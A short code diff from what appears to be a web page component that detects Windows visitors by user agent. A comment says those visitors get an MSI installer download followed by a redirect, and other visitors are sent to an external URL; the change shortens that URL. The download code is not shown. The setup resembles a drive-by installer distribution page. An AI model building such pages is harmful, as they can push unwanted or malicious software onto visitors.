@@ -5,7 +5,7 @@ export default function Home() {
     const userAgent = navigator.userAgent || '';
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms/N0123N";
+    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
 
     // 1. Windows users → MSI download, then redirect
     if (isWindows) {
